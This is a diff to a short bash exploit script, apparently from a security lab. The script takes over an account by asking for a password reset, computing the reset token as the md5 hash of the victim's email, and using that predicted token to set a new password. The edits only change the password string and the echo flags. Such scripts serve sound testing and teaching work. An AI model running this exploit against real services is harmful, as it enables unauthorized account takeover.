@@ -4,7 +4,7 @@
 source $(dirname "$0")/../config.sh
 
 TARGET_EMAIL="4.6@example.com"
-NEW_PASSWORD="NewPassViaPredictedToken"
+NEW_PASSWORD="NewP@ssViaPred1ctedToken"
 
 # Make a request to /forget-password for the target email to populate the database with the token,
 # but we do not use the response, we will try to predict it in the next step
@@ -15,13 +15,13 @@ curl -X 'POST' \
   -d "{\"email\": \"$TARGET_EMAIL\"}" > /dev/null
 
 # predict by computing the token that is just the md5 of the email
-echo "\nTry to predict the reset password token for account with email $TARGET_EMAIL..."
+echo -e "\nTry to predict the reset password token for account with email $TARGET_EMAIL..."
 TOKEN=$(echo -n "$TARGET_EMAIL" | md5sum | cut -d' ' -f1)
 echo "Predicted token: $TOKEN"
 
 # use it directly, bypassing the token that
 # would be sent to the email via forgot-password
-echo "\nTrying to reset password to a new one ($NEW_PASSWORD) using predicted token:"
+echo -e "\nTrying to reset password to a new one ($NEW_PASSWORD) using predicted token:"
 curl -s -X POST "$TARGET_IP/auth/reset-password" \
   -H "Content-Type: application/json" \
   -d "{\"token\": \"$TOKEN\", \"new_password\": \"$NEW_PASSWORD\"}" | jq .
